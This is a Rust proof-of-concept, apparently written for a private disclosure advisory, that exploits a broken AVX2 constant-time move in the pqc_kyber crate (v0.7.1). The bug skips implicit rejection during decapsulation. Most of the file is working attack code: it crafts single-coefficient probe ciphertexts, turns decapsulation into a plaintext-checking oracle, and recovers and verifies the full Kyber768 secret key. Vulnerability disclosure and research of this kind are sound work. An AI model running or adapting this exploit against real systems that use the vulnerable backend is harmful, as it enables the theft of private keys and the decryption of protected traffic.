// =====================================================================================
// pqc_kyber (Argyle-Software/kyber) v0.7.1 -- AVX2 `cmov` FO implicit-rejection bypass
// Proof-of-concept for an AUTHORIZED private coordinated-disclosure advisory.
//
// Root cause (src/avx2/verify.rs::cmov):
//   let bvec = _mm256_set1_epi64x(b as i64);      // b=1  -> lane 0x00000000_00000001
//   rvec = _mm256_blendv_epi8(rvec, xvec, bvec);  // every byte's high bit = 0 => copies NOTHING
// Correct pq-crystals form is  b = -b; _mm256_set1_epi8(b)  (mask = 0xFF..FF).
// In crypto_kem_dec (src/kem.rs) this `cmov` performs the Fujisaki-Okamoto implicit
// rejection:  cmov(&mut kr, z, KYBER_SYMBYTES=32, fail).  Because len==32 the entire copy
// runs through the broken 32-byte vector path (no scalar tail), so on an INVALID ciphertext
// (fail=1) the rejection secret z is NEVER written: kr[0..32] keeps the message-derived
// pre-key G(m'||h(pk))[0..32].  Result: the returned shared secret depends on the decrypted
// plaintext m' of an attacker-chosen ciphertext -> a plaintext-checking (PC) oracle.
//
// This single binary is compiled twice:
//   cargo run --release                 -> reference backend (correct cmov)
//   cargo run --release --features avx2 -> avx2 backend      (broken cmov)
// =====================================================================================

use pqc_kyber::poc::{
    self, cmov, hash_g, hash_h, indcpa_dec, kdf, KYBER_CIPHERTEXTBYTES, KYBER_ETA1, KYBER_K, KYBER_N,
    KYBER_POLYVECCOMPRESSEDBYTES, KYBER_PUBLICKEYBYTES, KYBER_Q, KYBER_SECRETKEYBYTES,
    KYBER_SYMBYTES,
};
use pqc_kyber::{decapsulate, encapsulate, keypair, Keypair};
use rand_core::{CryptoRng, Error as RandError, RngCore};
use std::time::Instant;

// ---------------------------------------------------------------------------
// Deterministic, seedable RNG (splitmix64) for full reproducibility.
// ---------------------------------------------------------------------------
struct DetRng {
    s: u64,
}
impl DetRng {
    fn new(seed: u64) -> Self {
        DetRng { s: seed }
    }
    #[inline]
    fn next_u64_(&mut self) -> u64 {
        self.s = self.s.wrapping_add(0x9E37_79B9_7F4A_7C15);
        let mut z = self.s;
        z = (z ^ (z >> 30)).wrapping_mul(0xBF58_476D_1CE4_E5B9);
        z = (z ^ (z >> 27)).wrapping_mul(0x94D0_49BB_1331_11EB);
        z ^ (z >> 31)
    }
}
impl RngCore for DetRng {
    fn next_u32(&mut self) -> u32 {
        self.next_u64_() as u32
    }
    fn next_u64(&mut self) -> u64 {
        self.next_u64_()
    }
    fn fill_bytes(&mut self, dest: &mut [u8]) {
        for chunk in dest.chunks_mut(8) {
            let r = self.next_u64_().to_le_bytes();
            chunk.copy_from_slice(&r[..chunk.len()]);
        }
    }
    fn try_fill_bytes(&mut self, dest: &mut [u8]) -> Result<(), RandError> {
        self.fill_bytes(dest);
        Ok(())
    }
}
impl CryptoRng for DetRng {}

fn hex(b: &[u8]) -> String {
    let mut s = String::with_capacity(b.len() * 2);
    for x in b {
        s.push_str(&format!("{:02x}", x));
    }
    s
}

// ---------------------------------------------------------------------------
// Attacker-side recomputation of the avx2 (broken) decapsulation shared secret
// for a HYPOTHESISED plaintext message m.  Uses only public values:
//   h(pk) = SHA3-256(pk),  ct',  G=SHA3-512, H=SHA3-256, KDF=SHAKE256.
//   ss = KDF( G(m || h(pk))[0..32]  ||  H(ct') )
// This mirrors crypto_kem_dec exactly on the broken path (cmov is a no-op).
// ---------------------------------------------------------------------------
fn oracle_ss_for_msg(m: &[u8; 32], hpk: &[u8; 32], ct: &[u8]) -> [u8; 32] {
    let mut buf = [0u8; 2 * KYBER_SYMBYTES];
    buf[..KYBER_SYMBYTES].copy_from_slice(m);
    buf[KYBER_SYMBYTES..].copy_from_slice(hpk);
    let mut kr = [0u8; 2 * KYBER_SYMBYTES];
    hash_g(&mut kr, &buf, 2 * KYBER_SYMBYTES); // kr[0..32] = pre-key
    hash_h(&mut kr[KYBER_SYMBYTES..], ct, KYBER_CIPHERTEXTBYTES); // kr[32..64] = H(ct)
    let mut ss = [0u8; 32];
    kdf(&mut ss, &kr, 2 * KYBER_SYMBYTES);
    ss
}

// ---------------------------------------------------------------------------
// Ciphertext crafting (kyber768: K=3, du=10, dv=4, CT=1088).
// We write compressed CODE words directly into the wire format so the crate's
// internal decompression yields exactly the values we want:
//   u decompress(code)  = round(q*code/1024)
//   v decompress(code)  = round(q*code/16)
// ---------------------------------------------------------------------------
const CT: usize = KYBER_CIPHERTEXTBYTES;

// Pack polyvec u codes (10-bit, 4 codes -> 5 bytes) and poly v codes (4-bit,
// 8 codes -> 4 bytes), matching reference polyvec_compress / poly_compress.
fn pack_ct(u_codes: &[[u16; KYBER_N]; KYBER_K], v_codes: &[u16; KYBER_N]) -> [u8; CT] {
    // Generic LSB-first bit packer, matching reference polyvec_compress / poly_compress
    // for any (du, dv). N*du and N*dv are multiples of 8 for every ML-KEM parameter set.
    let mut ct = [0u8; CT];
    let mut pos = 0usize;
    let mut acc: u32 = 0;
    let mut nbits: u32 = 0;
    for i in 0..KYBER_K {
        for j in 0..KYBER_N {
            acc |= ((u_codes[i][j] as u32) & ((1 << DU) - 1)) << nbits;
            nbits += DU;
            while nbits >= 8 { ct[pos] = (acc & 0xff) as u8; pos += 1; acc >>= 8; nbits -= 8; }
        }
    }
    debug_assert_eq!(pos, KYBER_POLYVECCOMPRESSEDBYTES);
    debug_assert_eq!(nbits, 0);
    for j in 0..KYBER_N {
        acc |= ((v_codes[j] as u32) & ((1 << DV) - 1)) << nbits;
        nbits += DV;
        while nbits >= 8 { ct[pos] = (acc & 0xff) as u8; pos += 1; acc >>= 8; nbits -= 8; }
    }
    debug_assert_eq!(pos, CT);
    ct
}

// Decompression (reference formulas) -- only used for the schoolbook functional
// verification of the recovered key (NOT part of the attack path).
fn u_decompress(code: u16) -> i32 {
    let mask = (1u32 << DU) - 1;
    (((code as u32 & mask) * KYBER_Q as u32 + (1 << (DU - 1))) >> DU) as i32
}
fn v_decompress(code: u16) -> i32 {
    let mask = (1u32 << DV) - 1;
    (((code as u32 & mask) * KYBER_Q as u32 + (1 << (DV - 1))) >> DV) as i32
}

// The single-coefficient probe u-code: decompresses to C ~ 400 (< q/8) so that
// every NON-target output coefficient  C*s (|s|<=2, |C*s|<=800 < q/4) decodes to 0,
// keeping the decrypted message in {0, e_j}.
const DU: u32 = (KYBER_POLYVECCOMPRESSEDBYTES * 8 / (KYBER_K * KYBER_N)) as u32;
const DV: u32 = ((KYBER_CIPHERTEXTBYTES - KYBER_POLYVECCOMPRESSEDBYTES) * 8 / KYBER_N) as u32;
const C_TARGET: u64 = if KYBER_ETA1 >= 3 { 250 } else { 400 };
const YU: u16 = (((C_TARGET << DU) + (KYBER_Q as u64) / 2) / (KYBER_Q as u64)) as u16;

// poly_tomsg decode of a single coefficient value (mod q) -> message bit.
fn decode_bit(val: i32) -> u8 {
    let q = KYBER_Q as i32;
    let mut t = val.rem_euclid(q);
    t = ((t << 1) + q / 2) / q;
    (t & 1) as u8
}

// Attacker's model of the target coefficient's decoded bit for a hypothesised
// secret value `s`, at v-code `yv`:  mp = C*s - v  (mod q).
fn predicted_bit(s: i16, yv: u16) -> u8 {
    let c = u_decompress(YU);
    let v = v_decompress(yv);
    decode_bit(c * s as i32 - v)
}

// Build the probe ciphertext isolating secret coefficient (component `t0`, index `j`).
fn craft(t0: usize, j: usize, yv: u16) -> [u8; CT] {
    let mut u_codes = [[0u16; KYBER_N]; KYBER_K];
    u_codes[t0][0] = YU; // constant polynomial C in component t0
    let mut v_codes = [0u16; KYBER_N];
    v_codes[j] = yv;
    pack_ct(&u_codes, &v_codes)
}

// Negacyclic schoolbook multiply mod q (x^256 = -1) for the functional check.
fn negamul(a: &[i32; KYBER_N], b: &[i32; KYBER_N]) -> [i32; KYBER_N] {
    let q = KYBER_Q as i64;
    let mut c = [0i64; KYBER_N];
    for i in 0..KYBER_N {
        for k in 0..KYBER_N {
            let mut idx = i + k;
            let mut coeff = (a[i] as i64) * (b[k] as i64);
            if idx >= KYBER_N {
                idx -= KYBER_N;
                coeff = -coeff;
            }
            c[idx] = (c[idx] + coeff) % q;
        }
    }
    let mut r = [0i32; KYBER_N];
    for i in 0..KYBER_N {
        r[i] = c[i].rem_euclid(q) as i32;
    }
    r
}

fn main() {
    println!("================================================================");
    println!(" pqc_kyber v0.7.1  AVX2 cmov FO-bypass PoC");
    println!(" backend compiled: {}", poc::POC_BACKEND);
    println!(
        " params: KYBER_K={} N={} Q={} CT={} SK={} PK={}",
        KYBER_K, KYBER_N, KYBER_Q, KYBER_CIPHERTEXTBYTES, KYBER_SECRETKEYBYTES, KYBER_PUBLICKEYBYTES
    );
    println!("================================================================\n");

    // ---------------------------------------------------------------------
    // (1) PRIMITIVE-LEVEL PROBE of cmov: copy 32 bytes with condition bit b=1.
    //     Correct cmov => r becomes all 0xAA.  Broken avx2 cmov => r stays 0.
    // ---------------------------------------------------------------------
    let mut r = [0u8; 32];
    let x = [0xAAu8; 32];
    cmov(&mut r, &x, 32, 1);
    let copied = r.iter().all(|&b| b == 0xAA);
    println!("[L1.1] cmov(len=32, b=1) primitive probe:");
    println!(
        "       backend={:<9} copied_all_32_bytes={}  => {}",
        poc::POC_BACKEND,
        copied,
        if copied {
            "cmov CORRECT (implicit rejection works)"
        } else {
            "cmov BROKEN (implicit rejection SKIPPED)  <-- BUG"
        }
    );
    println!("       r[0..8] = {}\n", hex(&r[..8]));

    // ---------------------------------------------------------------------
    // (2) Deterministic keypair + valid round-trip (must pass on BOTH builds).
    // ---------------------------------------------------------------------
    let seed: u64 = std::env::var("KYBER_SEED").ok()
        .and_then(|s| u64::from_str_radix(s.trim_start_matches("0x"), 16).ok())
        .unwrap_or(0xC0FFEE_1234_5678);
    let mut krng = DetRng::new(seed);
    let kp: Keypair = keypair(&mut krng).expect("keypair");
    let pk = kp.public;
    let sk = kp.secret;

    let mut erng = DetRng::new(0xABCD_0000_9999);
    let (ct, ss_enc) = encapsulate(&pk, &mut erng).expect("encapsulate");
    let ss_dec_valid = decapsulate(&ct, &sk).expect("decapsulate valid");
    let roundtrip_ok = ss_enc == ss_dec_valid;
    println!("[L1.2] valid round-trip (a correct cmov is a no-op on success):");
    println!("       ss_enc         = {}", hex(&ss_enc));
    println!("       ss_dec(valid)  = {}", hex(&ss_dec_valid));
    println!("       round-trip OK  = {}\n", roundtrip_ok);
    assert!(roundtrip_ok, "valid round-trip must hold on both builds");

    // ---------------------------------------------------------------------
    // (3) Corrupt the ciphertext -> ct'.  Decapsulate the INVALID ct'.
    //     reference build => ss = KDF(z || H(ct'))     (proper implicit rejection)
    //     avx2 build      => ss = KDF(G(m'||h(pk))[..32] || H(ct'))  (rejection skipped)
    // ---------------------------------------------------------------------
    let mut ctp = ct;
    ctp[0] ^= 0xff;
    ctp[100] ^= 0x55;
    ctp[500] ^= 0x01;
    let ss_inv = decapsulate(&ctp, &sk).expect("decapsulate invalid");
    println!("[L1.3] decapsulate(corrupted ct'):");
    println!("       backend={}", poc::POC_BACKEND);
    println!("       ss(ct') = {}", hex(&ss_inv));

    // Persist for cross-build comparison by the driver script.
    let tag = poc::POC_BACKEND;
    std::fs::write(
        format!("out_ss_{}.txt", tag),
        format!(
            "backend={}\nss_valid={}\nss_invalid={}\ncmov_copied={}\n",
            tag,
            hex(&ss_dec_valid),
            hex(&ss_inv),
            copied
        ),
    )
    .ok();
    println!(
        "       (saved to out_ss_{}.txt for cross-build diff)\n",
        tag
    );

    // The plaintext-checking oracle and full key recovery only manifest on the
    // vulnerable avx2 build.  On the reference build we stop here.
    if poc::POC_BACKEND != "avx2" {
        println!("[L1.4/L2] reference backend: implicit rejection is correct, no oracle. Done.");
        return;
    }

    // ---------------------------------------------------------------------
    // (4) PROVE it is a PLAINTEXT-CHECKING ORACLE.
    //     Attacker knows pk (=> h(pk)=SHA3-256(pk)) and ct'.  Obtain the true
    //     m' = indcpa_dec(ct',sk) as ground truth, recompute the expected avx2
    //     shared secret, and show it EQUALS the oracle output.  A wrong guess m''
    //     yields a different secret => the attacker can test message guesses.
    // ---------------------------------------------------------------------
    let mut hpk = [0u8; 32];
    hash_h(&mut hpk, &pk, KYBER_PUBLICKEYBYTES);

    let mut mprime = [0u8; 32];
    indcpa_dec(&mut mprime, &ctp, &sk); // ground-truth plaintext of ct'
    let ss_pred_true = oracle_ss_for_msg(&mprime, &hpk, &ctp);

    let mut mwrong = mprime;
    mwrong[0] ^= 0x01; // single-bit-wrong guess
    let ss_pred_wrong = oracle_ss_for_msg(&mwrong, &hpk, &ctp);

    println!("[L1.4] plaintext-checking oracle demonstration (avx2):");
    println!("       h(pk)=SHA3-256(pk)      = {}", hex(&hpk));
    println!("       true m'=indcpa_dec(ct') = {}", hex(&mprime));
    println!("       oracle ss(ct')          = {}", hex(&ss_inv));
    println!("       recomputed ss for m'    = {}", hex(&ss_pred_true));
    println!("       recomputed ss for m''   = {}", hex(&ss_pred_wrong));
    let match_true = ss_pred_true == ss_inv;
    let match_wrong = ss_pred_wrong == ss_inv;
    println!(
        "       ss(m') == oracle : {}   ss(m'') == oracle : {}",
        match_true, match_wrong
    );
    assert!(match_true, "PC oracle: true-m' recomputation must match");
    assert!(!match_wrong, "PC oracle: wrong-m'' must differ");
    println!("       => oracle output is a deterministic, attacker-computable function of m'.");
    println!("       => PLAINTEXT-CHECKING ORACLE confirmed.\n");

    // ---------------------------------------------------------------------
    // (L2) FULL SECRET-KEY RECOVERY via the PC oracle (Ravi et al. 2020 style).
    //   For each secret component t0 and coefficient j, craft a ciphertext that
    //   isolates C*s_{t0}[j] into message coefficient j (all others decode to 0),
    //   so the decrypted message m' is either 0 or e_j.  Read that bit from the
    //   oracle by testing the two candidate shared secrets, sweep the v-code to
    //   locate the decode threshold, and deduce s_{t0}[j] in {-2..2}.
    // ---------------------------------------------------------------------
    let eta = KYBER_ETA1 as i16;
    let cand: Vec<i16> = (-eta..=eta).collect();

    // Sanity: the 16-level bit signatures of the 5 secret values must be distinct.
    let sigs: Vec<Vec<u8>> = cand
        .iter()
        .map(|&s| (0..16u16).map(|yv| predicted_bit(s, yv)).collect())
        .collect();
    for a in 0..cand.len() {
        for b in (a + 1)..cand.len() {
            assert_ne!(sigs[a], sigs[b], "secret-value signatures must be distinct");
        }
    }
    println!("[L2] key recovery via PC oracle (C={}):", u_decompress(YU));

    let msg_zero = [0u8; 32];
    let mut s_rec = [[0i16; KYBER_N]; KYBER_K];
    let mut s_truth = [[0i16; KYBER_N]; KYBER_K]; // from indcpa_dec ground truth
    let mut queries: u64 = 0;
    let mut oracle_truth_agree: u64 = 0;
    let mut anomalies: u64 = 0;
    let t_start = Instant::now();

    for t0 in 0..KYBER_K {
        for j in 0..KYBER_N {
            let mut e_j = [0u8; 32];
            e_j[j / 8] = 1u8 << (j % 8);

            let mut alive: Vec<i16> = cand.clone();
            let mut alive_t: Vec<i16> = cand.clone();

            for yv in 0..16u16 {
                if alive.len() == 1 {
                    break;
                }
                let ctc = craft(t0, j, yv);

                // ---- attacker: read the bit from the ss oracle (only uses pk+oracle) ----
                let ss_obs = decapsulate(&ctc, &sk).expect("decap");
                queries += 1;
                let ss0 = oracle_ss_for_msg(&msg_zero, &hpk, &ctc);
                let sse = oracle_ss_for_msg(&e_j, &hpk, &ctc);
                let obit = if ss_obs == sse {
                    1u8
                } else if ss_obs == ss0 {
                    0u8
                } else {
                    anomalies += 1;
                    // message had unexpected extra bits; skip this level
                    continue;
                };

                // ---- ground truth: the real decrypted bit (uses real sk) ----
                let mut mt = [0u8; 32];
                indcpa_dec(&mut mt, &ctc, &sk);
                let tbit = (mt[j / 8] >> (j % 8)) & 1;
                if obit == tbit {
                    oracle_truth_agree += 1;
                }

                alive.retain(|&s| predicted_bit(s, yv) == obit);
                alive_t.retain(|&s| predicted_bit(s, yv) == tbit);
            }

            s_rec[t0][j] = if alive.len() == 1 { alive[0] } else { 99 };
            s_truth[t0][j] = if alive_t.len() == 1 { alive_t[0] } else { 99 };
        }
    }
    let elapsed = t_start.elapsed();

    // ---- compare recovered secret to ground truth (per-coefficient) ----
    let mut mismatches = 0u64;
    let mut unresolved = 0u64;
    for t0 in 0..KYBER_K {
        for j in 0..KYBER_N {
            if s_rec[t0][j] == 99 {
                unresolved += 1;
            } else if s_rec[t0][j] != s_truth[t0][j] {
                mismatches += 1;
            }
        }
    }

    println!("     oracle queries (decapsulate calls) : {}", queries);
    println!("     oracle-bit == plaintext-bit agree   : {}", oracle_truth_agree);
    println!("     anomalies (unexpected message)      : {}", anomalies);
    println!("     unresolved coefficients             : {}", unresolved);
    println!(
        "     recovered vs ground-truth mismatches: {}  (over {} coeffs)",
        mismatches,
        KYBER_K * KYBER_N
    );
    println!("     wall-clock                          : {:.3?}", elapsed);

    // Print a small slice of the recovered secret for the record.
    print!("     s_rec[0][0..16]   = [");
    for j in 0..16 {
        print!("{}{}", if j > 0 { "," } else { "" }, s_rec[0][j]);
    }
    println!("]");
    print!("     s_truth[0][0..16] = [");
    for j in 0..16 {
        print!("{}{}", if j > 0 { "," } else { "" }, s_truth[0][j]);
    }
    println!("]");

    // ---------------------------------------------------------------------
    // Independent functional verification: does the recovered secret reproduce
    // the crate's real decryption (with the real sk) on random valid ciphertexts?
    // ---------------------------------------------------------------------
    let mut frng = DetRng::new(0x5555_AAAA_1111);
    let mut func_ct = 0u64;
    let mut func_ok = 0u64;
    for _ in 0..64 {
        let (rct, _) = encapsulate(&pk, &mut frng).expect("enc");
        // decompress u (polyvec) and v (poly) from the wire ciphertext.
        // Generic LSB-first bit unpacker, inverse of pack_ct, for any (du, dv).
        let mut u = [[0i32; KYBER_N]; KYBER_K];
        {
            let mut pos = 0usize;
            let mut acc: u32 = 0;
            let mut nbits: u32 = 0;
            let mask = (1u32 << DU) - 1;
            for i in 0..KYBER_K {
                for j in 0..KYBER_N {
                    while nbits < DU { acc |= (rct[pos] as u32) << nbits; pos += 1; nbits += 8; }
                    let code = (acc & mask) as u16;
                    acc >>= DU; nbits -= DU;
                    u[i][j] = u_decompress(code);
                }
            }
        }
        let mut v = [0i32; KYBER_N];
        {
            let mut pos = KYBER_POLYVECCOMPRESSEDBYTES;
            let mut acc: u32 = 0;
            let mut nbits: u32 = 0;
            let mask = (1u32 << DV) - 1;
            for k in 0..KYBER_N {
                while nbits < DV { acc |= (rct[pos] as u32) << nbits; pos += 1; nbits += 8; }
                let code = (acc & mask) as u16;
                acc >>= DV; nbits -= DV;
                v[k] = v_decompress(code);
            }
        }
        // mp = sum_t s_rec[t] * u[t]  (negacyclic) ; message = decode(mp - v)
        let mut acc = [0i32; KYBER_N];
        for t0 in 0..KYBER_K {
            let s_poly: [i32; KYBER_N] = std::array::from_fn(|k| s_rec[t0][k] as i32);
            let prod = negamul(&s_poly, &u[t0]);
            for k in 0..KYBER_N {
                acc[k] = (acc[k] + prod[k]) % (KYBER_Q as i32);
            }
        }
        let mut pred_msg = [0u8; 32];
        for k in 0..KYBER_N {
            let bit = decode_bit(acc[k] - v[k]);
            pred_msg[k / 8] |= bit << (k % 8);
        }
        let mut true_msg = [0u8; 32];
        indcpa_dec(&mut true_msg, &rct, &sk);
        func_ct += 1;
        if pred_msg == true_msg {
            func_ok += 1;
        }
    }
    println!(
        "     functional check: recovered-s reproduces indcpa_dec on {}/{} random ciphertexts",
        func_ok, func_ct
    );

    let complete = unresolved == 0 && mismatches == 0 && func_ok == func_ct;
    println!(
        "\n[L2 RESULT] key recovery: {}",
        if complete {
            "COMPLETE and VERIFIED against ground-truth sk"
        } else if mismatches == 0 && unresolved == 0 {
            "coefficients matched but functional check imperfect (see counts)"
        } else {
            "PARTIAL/FAILED (see counts)"
        }
    );
}
